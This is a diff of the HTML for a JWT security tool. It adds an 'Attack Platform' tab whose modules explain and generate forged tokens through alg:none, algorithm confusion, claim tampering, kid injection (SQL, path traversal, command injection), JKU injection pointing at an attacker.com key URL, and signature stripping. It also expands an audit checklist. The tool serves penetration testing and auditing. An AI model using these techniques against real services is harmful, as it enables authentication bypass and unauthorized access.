+              <button class="jg-hdr-btn" onclick="jgSendToEditor()">→ Editor</button>
+              <button class="jg-hdr-btn" onclick="jgSendToAttack()">→ Attack</button>
+            </div>
+          </div>
+          <div class="jg-card-body">
+            <!-- Color visualization -->
+            <div class="jg-token-visual" id="jgTokenVisual" onclick="jgCopyToken()" title="Click to copy"></div>
+
+            <!-- Stats row -->
+            <div class="jg-stats-row">
+              <div class="jg-stat-pill"><span class="jg-stat-k">Algorithm</span><span class="jg-stat-v" id="jgSAlg">—</span></div>
+              <div class="jg-stat-pill"><span class="jg-stat-k">Size</span><span class="jg-stat-v" id="jgSSize">—</span></div>
+              <div class="jg-stat-pill"><span class="jg-stat-k">Claims</span><span class="jg-stat-v" id="jgSClaims">—</span></div>
+              <div class="jg-stat-pill"><span class="jg-stat-k">Expires</span><span class="jg-stat-v" id="jgSExp">—</span></div>
+              <div class="jg-stat-pill"><span class="jg-stat-k">Signed</span><span class="jg-stat-v" id="jgSSigned">—</span></div>
+            </div>
+
+            <!-- Raw token textarea (selectable) -->
+            <div class="jg-field" style="margin-top:12px">
+              <label class="jg-label">Raw Token (click to select all)</label>
+              <textarea id="jgRawOut" class="jg-textarea" rows="4" readonly onclick="this.select()" style="font-size:10px;color:var(--text2);cursor:pointer"></textarea>
+            </div>
+
+            <!-- Decoded preview -->
+            <div class="jg-decoded-grid">
+              <div>
+                <div class="jg-label" style="margin-bottom:4px"><span style="color:var(--red)">■</span> Decoded Header</div>
+                <pre class="jg-decoded-pre" id="jgDecodedHeader"></pre>
+              </div>
+              <div>
+                <div class="jg-label" style="margin-bottom:4px"><span style="color:var(--cyan)">■</span> Decoded Payload</div>
+                <pre class="jg-decoded-pre" id="jgDecodedPayload"></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Public Key output (for RSA/EC) -->
+        <div class="jg-card" id="jgPublicKeyCard" style="display:none">
+          <div class="jg-card-hdr">
+            <span>Public Key (share for verification)</span>
+            <button class="jg-hdr-btn" onclick="navigator.clipboard.writeText(document.getElementById('jgPubKeyOut').value).then(()=>showToast('Public key copied!'))">Copy</button>
+          </div>
+          <div class="jg-card-body jg-no-pad">
+            <textarea id="jgPubKeyOut" class="jg-textarea" rows="7" readonly style="border:none;border-radius:0;font-size:10px;color:var(--green)"></textarea>
+          </div>
+        </div>
+
+      </div><!-- /right -->
+    </div><!-- /layout -->
+  </div><!-- /tab-generator -->
+
+  <!-- ════════════════════════════════════
+       TAB — Attack Platform
+       ════════════════════════════════════ -->
+  <div class="tab-panel" id="tab-attack">
+
+    <div class="atk-tab-hint">
+      ⚠️ <strong>Authorized Testing Only.</strong> This platform generates attack payloads for security research and penetration testing.
+      Always obtain explicit written permission before testing any system. All operations are 100% client-side — no data leaves your browser.
+    </div>
+
+    <div class="atk-layout">
+
+      <!-- ── Left sidebar: token input + module nav ── -->
+      <div class="atk-sidebar">
+
+        <div class="atk-token-card">
+          <div class="atk-token-header">
+            <span class="atk-token-title">Source JWT Token</span>
+            <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkPasteFromDecoder()">From Decoder</button>
+          </div>
+          <textarea id="atkSourceToken" placeholder="Paste target JWT token here..." spellcheck="false" oninput="atkTokenChanged()"></textarea>
+          <div style="padding:8px 12px;background:var(--bg3);border-top:1px solid var(--border)">
+            <div id="atkTokenInfo" style="font-size:10px;color:var(--text3)">No token loaded</div>
+          </div>
+        </div>
+
+        <div class="atk-module-nav">
+          <div class="atk-module-nav-title">Attack Modules</div>
+          <div class="atk-nav-item active" onclick="atkShowModule('algnone')">
+            <span class="atk-nav-icon">🚫</span>
+            <span class="atk-nav-label">Algorithm None</span>
+            <span class="atk-nav-badge badge-critical">Critical</span>
+          </div>
+          <div class="atk-nav-item" onclick="atkShowModule('algconf')">
+            <span class="atk-nav-icon">🔀</span>
+            <span class="atk-nav-label">Algorithm Confusion</span>
+            <span class="atk-nav-badge badge-critical">Critical</span>
+          </div>
+          <div class="atk-nav-item" onclick="atkShowModule('claimtamper')">
+            <span class="atk-nav-icon">✏️</span>
+            <span class="atk-nav-label">Claim Tampering</span>
+            <span class="atk-nav-badge badge-high">High</span>
+          </div>
+          <div class="atk-nav-item" onclick="atkShowModule('kidattack')">
+            <span class="atk-nav-icon">🗝️</span>
+            <span class="atk-nav-label">kid Injection</span>
+            <span class="atk-nav-badge badge-critical">Critical</span>
+          </div>
+          <div class="atk-nav-item" onclick="atkShowModule('jwkinject')">
+            <span class="atk-nav-icon">🔑</span>
+            <span class="atk-nav-label">JWK / JKU Injection</span>
+            <span class="atk-nav-badge badge-critical">Critical</span>
+          </div>
+          <div class="atk-nav-item" onclick="atkShowModule('expmanip')">
+            <span class="atk-nav-icon">⏰</span>
+            <span class="atk-nav-label">Expiry Manipulation</span>
+            <span class="atk-nav-badge badge-high">High</span>
+          </div>
+          <div class="atk-nav-item" onclick="atkShowModule('sigstrip')">
+            <span class="atk-nav-icon">✂️</span>
+            <span class="atk-nav-label">Signature Stripping</span>
+            <span class="atk-nav-badge badge-critical">Critical</span>
+          </div>
+        </div>
+
+      </div><!-- /sidebar -->
+
+      <!-- ── Right: module panels ── -->
+      <div id="atkPanelArea">
+
+        <!-- MODULE 1: Algorithm None -->
+        <div class="atk-panel active" id="atk-algnone">
+          <div class="atk-module-card">
+            <div class="atk-module-header">
+              <div class="atk-module-icon">🚫</div>
+              <div class="atk-module-meta">
+                <div class="atk-module-name">Algorithm None Attack</div>
+                <div class="atk-module-desc">Exploit servers that accept JWT tokens with <code>alg: none</code>, bypassing signature verification entirely and allowing complete authentication bypass.</div>
+              </div>
+              <span class="atk-nav-badge badge-critical" style="align-self:flex-start">Critical</span>
+            </div>
+            <div class="atk-module-body">
+              <div class="atk-section-label">How it Works</div>
+              <div class="atk-how-it-works">
+                <ol>
+                  <li>Decode the original token to extract the payload</li>
+                  <li>Modify the header to set <code>alg</code> to <code>"none"</code> (or a variant)</li>
+                  <li>Re-encode header + payload with an empty or no signature</li>
+                  <li>If the server accepts it → signature verification is broken</li>
+                </ol>
+              </div>
+
+              <div class="atk-section-label">Algorithm Variant</div>
+              <div class="atk-variants" id="algNoneVariants">
+                <button class="atk-variant-btn sel" onclick="selectAtkVariant('algNoneVariants',this,'none')">none</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('algNoneVariants',this,'None')">None</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('algNoneVariants',this,'NONE')">NONE</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('algNoneVariants',this,'nOnE')">nOnE</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('algNoneVariants',this,'NoNe')">NoNe</button>
+              </div>
+
+              <div class="atk-section-label">Payload Modification (optional)</div>
+              <div class="atk-field">
+                <label>Modify Payload JSON (leave blank to keep original)</label>
+                <textarea id="algNonePayload" placeholder='{"sub":"1","role":"admin"}'></textarea>
+              </div>
+
+              <button class="atk-run-btn" onclick="runAlgNone()">⚔️ Generate alg:none Token</button>
+
+              <div class="atk-result" id="algNoneResult">
+                <div class="atk-result-header">
+                  <span class="atk-result-label">Generated Attack Token</span>
+                  <div class="atk-result-actions">
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkCopy('algNoneOut')">Copy</button>
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkSendDecoder('algNoneOut')">→ Decoder</button>
+                  </div>
+                </div>
+                <div class="atk-token-out" id="algNoneOut" onclick="atkCopy('algNoneOut')"></div>
+                <div class="atk-what-to-look">
+                  <strong>What to Look For:</strong>
+                  <ul>
+                    <li>HTTP 200 / successful response → server accepts unsigned tokens</li>
+                    <li>HTTP 401 / "invalid signature" → server correctly rejects alg:none</li>
+                    <li>Try all 5 case variants — some parsers are case-insensitive</li>
+                    <li>Test with and without the trailing dot in the signature field</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div><!-- /algnone -->
+
+        <!-- MODULE 2: Algorithm Confusion -->
+        <div class="atk-panel" id="atk-algconf">
+          <div class="atk-module-card">
+            <div class="atk-module-header">
+              <div class="atk-module-icon">🔀</div>
+              <div class="atk-module-meta">
+                <div class="atk-module-name">Algorithm Confusion Attack</div>
+                <div class="atk-module-desc">Exploit RS256/ES256 servers by switching to HS256 and signing with the server's public key as the HMAC secret — allowing token forgery without the private key.</div>
+              </div>
+              <span class="atk-nav-badge badge-critical" style="align-self:flex-start">Critical</span>
+            </div>
+            <div class="atk-module-body">
+              <div class="atk-section-label">How it Works</div>
+              <div class="atk-how-it-works">
+                <ol>
+                  <li>Obtain the server's RSA/EC <strong>public key</strong> (from JWKS endpoint, x5c header, or disclosed in source)</li>
+                  <li>Change the token's <code>alg</code> header from <code>RS256</code> → <code>HS256</code></li>
+                  <li>Sign the modified token using the public key as the HMAC-SHA256 secret</li>
+                  <li>Vulnerable servers that trust the token's <code>alg</code> header will use the public key to verify — and succeed</li>
+                </ol>
+              </div>
+
+              <div class="atk-section-label">Target Algorithm</div>
+              <div class="atk-variants" id="algConfTarget">
+                <button class="atk-variant-btn sel" onclick="selectAtkVariant('algConfTarget',this,'HS256')">→ HS256</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('algConfTarget',this,'HS384')">→ HS384</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('algConfTarget',this,'HS512')">→ HS512</button>
+              </div>
+
+              <div class="atk-field">
+                <label>Server Public Key (PEM or raw) — used as HMAC secret</label>
+                <textarea id="algConfPubKey" placeholder="-----BEGIN PUBLIC KEY-----&#10;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...&#10;-----END PUBLIC KEY-----&#10;&#10;Or paste raw base64 public key bytes"></textarea>
+              </div>
+
+              <div class="atk-field">
+                <label>Modify Payload JSON (optional)</label>
+                <textarea id="algConfPayload" placeholder='{"sub":"1","role":"admin","exp":9999999999}'></textarea>
+              </div>
+
+              <button class="atk-run-btn" onclick="runAlgConf()">⚔️ Generate Confused Token</button>
+
+              <div class="atk-result" id="algConfResult">
+                <div class="atk-result-header">
+                  <span class="atk-result-label">Generated Attack Token</span>
+                  <div class="atk-result-actions">
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkCopy('algConfOut')">Copy</button>
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkSendDecoder('algConfOut')">→ Decoder</button>
+                  </div>
+                </div>
+                <div class="atk-token-out" id="algConfOut" onclick="atkCopy('algConfOut')"></div>
+                <div class="atk-what-to-look">
+                  <strong>What to Look For:</strong>
+                  <ul>
+                    <li>Successful auth → server trusts the <code>alg</code> header and used the public key as HMAC secret</li>
+                    <li>Obtain the public key from: <code>/.well-known/jwks.json</code>, <code>/oauth/discovery</code>, x5c header, or source code</li>
+                    <li>Test all three target algorithms (HS256/384/512) — server may accept any</li>
+                    <li>Reference: CVE-2016-5431 affected many popular JWT libraries</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div><!-- /algconf -->
+
+        <!-- MODULE 3: Claim Tampering -->
+        <div class="atk-panel" id="atk-claimtamper">
+          <div class="atk-module-card">
+            <div class="atk-module-header">
+              <div class="atk-module-icon">✏️</div>
+              <div class="atk-module-meta">
+                <div class="atk-module-name">Claim Tampering</div>
+                <div class="atk-module-desc">Modify payload claims (role escalation, subject substitution, custom injection) and optionally re-sign. Use when you have the secret or want to test unsigned claim acceptance.</div>
+              </div>
+              <span class="atk-nav-badge badge-high" style="align-self:flex-start">High</span>
+            </div>
+            <div class="atk-module-body">
+              <div class="atk-section-label">Quick Tamper Presets</div>
+              <div class="atk-variants">
+                <button class="atk-variant-btn" onclick="atkTamperPreset('admin')">🛡 Admin Role</button>
+                <button class="atk-variant-btn" onclick="atkTamperPreset('removeexp')">⏳ Remove exp</button>
+                <button class="atk-variant-btn" onclick="atkTamperPreset('extendexp')">📅 Extend exp</button>
+                <button class="atk-variant-btn" onclick="atkTamperPreset('subzero')">👤 sub: 0</button>
+                <button class="atk-variant-btn" onclick="atkTamperPreset('subadmin')">👑 sub: admin</button>
+                <button class="atk-variant-btn" onclick="atkTamperPreset('allperms')">🔓 All Permissions</button>
+              </div>
+
+              <div class="atk-field" style="margin-top:12px">
+                <label>Modified Payload JSON</label>
+                <textarea id="tamperPayload" rows="6" placeholder="Load a token first to populate this field..."></textarea>
+              </div>
+
+              <div class="atk-field">
+                <label>Re-sign with Secret (leave blank to keep original/empty signature)</label>
+                <input type="text" id="tamperSecret" placeholder="HMAC secret (if known)">
+              </div>
+
+              <div class="atk-field">
+                <label>Signing Algorithm (for re-sign)</label>
+                <select id="tamperAlg">
+                  <option value="HS256">HS256</option>
+                  <option value="HS384">HS384</option>
+                  <option value="HS512">HS512</option>
+                  <option value="none">none (unsigned)</option>
+                </select>
+              </div>
+
+              <button class="atk-run-btn" onclick="runClaimTamper()">⚔️ Generate Tampered Token</button>
+
+              <div class="atk-result" id="tamperResult">
+                <div class="atk-result-header">
+                  <span class="atk-result-label">Tampered Token</span>
+                  <div class="atk-result-actions">
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkCopy('tamperOut')">Copy</button>
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkSendDecoder('tamperOut')">→ Decoder</button>
+                  </div>
+                </div>
+                <div class="atk-token-out" id="tamperOut" onclick="atkCopy('tamperOut')"></div>
+                <div id="tamperDiff" class="atk-what-to-look" style="margin-top:8px"></div>
+              </div>
+            </div>
+          </div>
+        </div><!-- /claimtamper -->
+
+        <!-- MODULE 4: kid Injection -->
+        <div class="atk-panel" id="atk-kidattack">
+          <div class="atk-module-card">
+            <div class="atk-module-header">
+              <div class="atk-module-icon">🗝️</div>
+              <div class="atk-module-meta">
+                <div class="atk-module-name">kid Parameter Injection</div>
+                <div class="atk-module-desc">Inject malicious values into the <code>kid</code> header parameter to exploit SQL injection, path traversal, SSRF, or command injection in key lookup logic.</div>
+              </div>
+              <span class="atk-nav-badge badge-critical" style="align-self:flex-start">Critical</span>
+            </div>
+            <div class="atk-module-body">
+              <div class="atk-section-label">Attack Type</div>
+              <div class="atk-variants" id="kidAttackType">
+                <button class="atk-variant-btn sel" onclick="selectAtkVariant('kidAttackType',this,'sql')">SQL Injection</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('kidAttackType',this,'path')">Path Traversal</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('kidAttackType',this,'cmd')">Command Injection</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('kidAttackType',this,'ssrf')">SSRF</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('kidAttackType',this,'custom')">Custom</button>
+              </div>
+
+              <div class="atk-section-label" style="margin-top:12px">Payload Variants</div>
+              <div class="atk-variants" id="kidPayloadVariants"></div>
+
+              <div class="atk-field" style="margin-top:10px">
+                <label>kid Value to Inject</label>
+                <input type="text" id="kidValue" placeholder="Payload will appear here after selecting type">
+              </div>
+
+              <div class="atk-field">
+                <label>Sign with (HMAC secret — used for null byte / path traversal bypass)</label>
+                <input type="text" id="kidSecret" placeholder="Leave blank for unsigned / empty sig">
+              </div>
+
+              <button class="atk-run-btn" onclick="runKidAttack()">⚔️ Generate kid-Injected Token</button>
+
+              <div class="atk-result" id="kidResult">
+                <div class="atk-result-header">
+                  <span class="atk-result-label">Attack Token</span>
+                  <div class="atk-result-actions">
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkCopy('kidOut')">Copy</button>
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkSendDecoder('kidOut')">→ Decoder</button>
+                  </div>
+                </div>
+                <div class="atk-token-out" id="kidOut" onclick="atkCopy('kidOut')"></div>
+                <div class="atk-what-to-look">
+                  <strong>What to Look For:</strong>
+                  <ul>
+                    <li><strong>SQL injection:</strong> different response times, errors like "syntax error near '1'" or auth bypass</li>
+                    <li><strong>Path traversal:</strong> server error if it tries to open the file, or bypass if key file is /dev/null</li>
+                    <li><strong>Command injection:</strong> OOB DNS/HTTP callback from <code>id</code> command output, or delayed response</li>
+                    <li><strong>SSRF:</strong> HTTP requests to your listener, internal service responses in error messages</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div><!-- /kidattack -->
+
+        <!-- MODULE 5: JWK / JKU Injection -->
+        <div class="atk-panel" id="atk-jwkinject">
+          <div class="atk-module-card">
+            <div class="atk-module-header">
+              <div class="atk-module-icon">🔑</div>
+              <div class="atk-module-meta">
+                <div class="atk-module-name">JWK / JKU Header Injection</div>
+                <div class="atk-module-desc">Embed a self-signed JWK in the token header or point the <code>jku</code>/<code>x5u</code> header to an attacker-controlled URL — then sign with your own key pair.</div>
+              </div>
+              <span class="atk-nav-badge badge-critical" style="align-self:flex-start">Critical</span>
+            </div>
+            <div class="atk-module-body">
+              <div class="atk-section-label">Attack Type</div>
+              <div class="atk-variants" id="jwkAttackType">
+                <button class="atk-variant-btn sel" onclick="selectAtkVariant('jwkAttackType',this,'embedded_jwk')">Embedded JWK</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('jwkAttackType',this,'jku')">jku URL Injection</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('jwkAttackType',this,'x5u')">x5u URL Injection</button>
+              </div>
+
+              <div id="jwkEmbeddedFields">
+                <div class="atk-section-label" style="margin-top:12px">Embedded JWK Attack</div>
+                <div class="atk-how-it-works">
+                  Generate a key pair → embed the public JWK in the header → sign with the private key.
+                  Vulnerable servers that use the header's <code>jwk</code> to verify will accept the token.
+                </div>
+                <div class="atk-field">
+                  <label>Modify Payload JSON (optional)</label>
+                  <textarea id="jwkPayload" placeholder='{"sub":"admin","role":"admin","exp":9999999999}'></textarea>
+                </div>
+                <button class="btn btn-ghost" style="margin-bottom:12px;width:100%" onclick="generateJWKPair()">🔑 Generate ECDSA P-256 Key Pair</button>
+                <div class="atk-field">
+                  <label>Generated Public JWK (auto-filled)</label>
+                  <textarea id="jwkPublicKey" rows="5" placeholder="Click Generate Key Pair..." readonly style="color:var(--green);font-size:10px"></textarea>
+                </div>
+                <div class="atk-field">
+                  <label>Generated Private Key (auto-filled — used for signing)</label>
+                  <textarea id="jwkPrivateKey" rows="3" placeholder="Click Generate Key Pair..." readonly style="color:var(--orange);font-size:10px"></textarea>
+                </div>
+              </div>
+
+              <div id="jwkUrlFields" style="display:none">
+                <div class="atk-section-label" style="margin-top:12px">jku / x5u URL Injection</div>
+                <div class="atk-how-it-works">
+                  Point the <code>jku</code> or <code>x5u</code> header to your attacker-controlled JWKS endpoint.
+                  Host a JWKS JSON file with your own public key. Sign the token with the matching private key.
+                </div>
+                <div class="atk-field">
+                  <label>Attacker JWKS URL</label>
+                  <input type="text" id="jwkUrl" placeholder="https://attacker.com/jwks.json">
+                </div>
+                <div class="atk-field">
+                  <label>Modify Payload JSON (optional)</label>
+                  <textarea id="jwkUrlPayload" placeholder='{"sub":"admin","role":"admin","exp":9999999999}'></textarea>
+                </div>
+                <div class="atk-how-it-works" style="margin-top:10px">
+                  Host this JWKS JSON at your URL. Generate key pair above and use the public JWK in this structure:<br>
+                  <code>{"keys": [&lt;your public JWK&gt;]}</code>
+                </div>
+              </div>
+
+              <button class="atk-run-btn" onclick="runJWKAttack()">⚔️ Generate JWK Attack Token</button>
+
+              <div class="atk-result" id="jwkResult">
+                <div class="atk-result-header">
+                  <span class="atk-result-label">Attack Token</span>
+                  <div class="atk-result-actions">
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkCopy('jwkOut')">Copy</button>
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkSendDecoder('jwkOut')">→ Decoder</button>
+                  </div>
+                </div>
+                <div class="atk-token-out" id="jwkOut" onclick="atkCopy('jwkOut')"></div>
+                <div class="atk-what-to-look">
+                  <strong>What to Look For:</strong>
+                  <ul>
+                    <li><strong>Embedded JWK:</strong> successful auth means server uses header's jwk for verification — critical vulnerability</li>
+                    <li><strong>jku/x5u:</strong> check your attacker server logs for incoming HTTP requests from the target</li>
+                    <li>A successful response with modified claims proves the attack vector is exploitable</li>
+                    <li>Reference: CVE-2018-0114 (Cisco), numerous other library CVEs</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div><!-- /jwkinject -->
+
+        <!-- MODULE 6: Expiry Manipulation -->
+        <div class="atk-panel" id="atk-expmanip">
+          <div class="atk-module-card">
+            <div class="atk-module-header">
+              <div class="atk-module-icon">⏰</div>
+              <div class="atk-module-meta">
+                <div class="atk-module-name">Expiry Manipulation</div>
+                <div class="atk-module-desc">Extend, remove, or manipulate <code>exp</code>, <code>nbf</code>, and <code>iat</code> claims. Test token replay attacks and expired-token acceptance.</div>
+              </div>
+              <span class="atk-nav-badge badge-high" style="align-self:flex-start">High</span>
+            </div>
+            <div class="atk-module-body">
+              <div class="atk-section-label">Attack Strategy</div>
+              <div class="atk-variants" id="expAttackType">
+                <button class="atk-variant-btn sel" onclick="selectAtkVariant('expAttackType',this,'extend');atkExpStrategy('extend')">Extend exp</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('expAttackType',this,'remove');atkExpStrategy('remove')">Remove exp</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('expAttackType',this,'past');atkExpStrategy('past')">Far Future exp</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('expAttackType',this,'replay');atkExpStrategy('replay')">Replay (past token)</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('expAttackType',this,'nbf');atkExpStrategy('nbf')">nbf Bypass</button>
+              </div>
+
+              <div id="expExtendFields" style="margin-top:12px">
+                <div class="atk-field">
+                  <label>Extend exp by (hours)</label>
+                  <input type="number" id="expExtendHours" value="8760" min="1" placeholder="8760 = 1 year">
+                </div>
+              </div>
+
+              <div class="atk-field" style="margin-top:8px">
+                <label>Re-sign with Secret (optional — leave blank for original sig or unsigned)</label>
+                <input type="text" id="expSecret" placeholder="HMAC secret if known">
+              </div>
+              <div class="atk-field">
+                <label>Algorithm</label>
+                <select id="expAlg">
+                  <option value="HS256">HS256</option><option value="HS384">HS384</option>
+                  <option value="HS512">HS512</option><option value="none">none</option>
+                </select>
+              </div>
+
+              <button class="atk-run-btn" onclick="runExpManip()">⚔️ Generate Expiry-Manipulated Token</button>
+
+              <div class="atk-result" id="expResult">
+                <div class="atk-result-header">
+                  <span class="atk-result-label">Attack Token</span>
+                  <div class="atk-result-actions">
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkCopy('expOut')">Copy</button>
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkSendDecoder('expOut')">→ Decoder</button>
+                  </div>
+                </div>
+                <div class="atk-token-out" id="expOut" onclick="atkCopy('expOut')"></div>
+                <div class="atk-what-to-look">
+                  <strong>What to Look For:</strong>
+                  <ul>
+                    <li><strong>Extended/removed exp:</strong> if server accepts, expiration validation is broken</li>
+                    <li><strong>Far future exp:</strong> tests if server validates exp at all, and checks for max-age policy</li>
+                    <li><strong>Replay:</strong> send a legitimately expired token — if accepted, server skips exp check</li>
+                    <li><strong>nbf bypass:</strong> test if server enforces not-before claim properly</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div><!-- /expmanip -->
+
+        <!-- MODULE 7: Signature Stripping -->
+        <div class="atk-panel" id="atk-sigstrip">
+          <div class="atk-module-card">
+            <div class="atk-module-header">
+              <div class="atk-module-icon">✂️</div>
+              <div class="atk-module-meta">
+                <div class="atk-module-name">Signature Stripping</div>
+                <div class="atk-module-desc">Generate tokens with empty, truncated, or malformed signatures to test whether the server validates the signature field at all.</div>
+              </div>
+              <span class="atk-nav-badge badge-critical" style="align-self:flex-start">Critical</span>
+            </div>
+            <div class="atk-module-body">
+              <div class="atk-section-label">Strip Variant</div>
+              <div class="atk-variants" id="sigStripType">
+                <button class="atk-variant-btn sel" onclick="selectAtkVariant('sigStripType',this,'empty')">Empty Sig</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('sigStripType',this,'nodot')">No Trailing Dot</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('sigStripType',this,'truncate')">Truncated (4 chars)</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('sigStripType',this,'zeros')">All Zeros</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('sigStripType',this,'random')">Random Bytes</button>
+                <button class="atk-variant-btn" onclick="selectAtkVariant('sigStripType',this,'nullbyte')">Null Byte</button>
+              </div>
+
+              <div class="atk-field" style="margin-top:12px">
+                <label>Payload Modification (optional)</label>
+                <textarea id="sigStripPayload" placeholder="Leave blank to use original payload"></textarea>
+              </div>
+
+              <div class="atk-how-it-works" style="margin-top:10px">
+                Test all variants — different JWT libraries handle malformed signatures differently.
+                Some may accept empty, truncated, or zero-padded signatures due to implementation bugs.
+              </div>
+
+              <button class="atk-run-btn" onclick="runSigStrip()">⚔️ Generate Stripped Token</button>
+
+              <div class="atk-result" id="sigStripResult">
+                <div class="atk-result-header">
+                  <span class="atk-result-label">Attack Token</span>
+                  <div class="atk-result-actions">
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkCopy('sigStripOut')">Copy</button>
+                    <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="atkSendDecoder('sigStripOut')">→ Decoder</button>
+                  </div>
+                </div>
+                <div class="atk-token-out" id="sigStripOut" onclick="atkCopy('sigStripOut')"></div>
+                <div class="atk-what-to-look">
+                  <strong>What to Look For:</strong>
+                  <ul>
+                    <li>HTTP 200 with any variant → critical: server does not verify signatures</li>
+                    <li>Different responses for different variants may indicate partial validation bugs</li>
+                    <li>Test with payload modifications to confirm full auth bypass</li>
+                    <li>Note which library/version the server uses for CVE cross-reference</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div><!-- /sigstrip -->
+
+      </div><!-- /panel area -->
+    </div><!-- /layout -->
+  </div><!-- /tab-attack -->
+
   <!-- ════════════════════════════════════
        TAB 4 — Security Checklist
        ════════════════════════════════════ -->
   <div class="tab-panel" id="tab-checklist">
-    <p class="section-sub">50+ point JWT security audit checklist based on OWASP, RFC 7519, and real-world pen-testing experience.</p>
+    <p class="section-sub">120+ point JWT security audit checklist based on OWASP, RFC 7519, RFC 8725, CVE disclosures, and real-world pen-testing experience.</p>
 
-    <!-- P1: Critical -->
-    <div class="checklist-section">
-      <div class="checklist-section-title">
-        <span class="sev-badge sev-critical">Critical</span>
-        Algorithm &amp; Signature Vulnerabilities
+    <div class="cl-toolbar">
+      <div class="cl-search-wrap">
+        <span class="cl-search-icon">⌕</span>
+        <input type="text" id="clSearch" class="cl-search" placeholder="Search checklist items..." oninput="filterChecklist(this.value)">
       </div>
+      <div class="cl-filters">
+        <button class="cl-filter-btn active" data-f="all" onclick="setCLFilter('all',this)">All</button>
+        <button class="cl-filter-btn" data-f="critical" onclick="setCLFilter('critical',this)">🔴 Critical</button>
+        <button class="cl-filter-btn" data-f="high" onclick="setCLFilter('high',this)">🟠 High</button>
+        <button class="cl-filter-btn" data-f="medium" onclick="setCLFilter('medium',this)">🟡 Medium</button>
+        <button class="cl-filter-btn" data-f="low" onclick="setCLFilter('low',this)">🔵 Low</button>
+        <button class="cl-filter-btn" data-f="info" onclick="setCLFilter('info',this)">⚪ Info</button>
+      </div>
+      <div class="cl-counter" id="clCounter"></div>
+    </div>
+
+    <!-- ① Algorithm & Signature -->
+    <div class="checklist-section" data-section="Algorithm and Signature Vulnerabilities">
+      <div class="checklist-section-title"><span class="sev-badge sev-critical">Critical</span> Algorithm &amp; Signature Vulnerabilities</div>
       <table class="checklist-table">
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">alg:none Bypass</div><div class="check-desc">Verify the server rejects tokens with algorithm set to "none". An attacker can forge tokens without a secret.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">Algorithm Confusion (RS256 → HS256)</div><div class="check-desc">If the server uses RS256, try sending an HS256-signed token using the public key as the HMAC secret.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">Signature Not Verified</div><div class="check-desc">Check whether the server verifies the signature at all. Some implementations only decode without verifying.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">Empty Signature Accepted</div><div class="check-desc">Test if the server accepts tokens with an empty/truncated signature field.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">Weak HMAC Secret</div><div class="check-desc">Test for short, dictionary-based, or default secrets. Use the Secret Bruteforcer tab to audit.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🟠</td><td><div class="check-name">Weak Algorithm (HS256)</div><div class="check-desc">HS256 may be vulnerable to brute-force if secret entropy is low. Prefer HS512, RS256, or ES256.</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="critical" data-text="alg none bypass algorithm signature verification forged token"><td class="check-icon">🔴</td><td><div class="check-name">alg:none Bypass</div><div class="check-desc">Verify the server rejects tokens with algorithm set to "none". An attacker can forge tokens without any secret — complete auth bypass.</div><div class="check-ref">Ref: CVE-2015-9235 · RFC 8725 §2.1</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
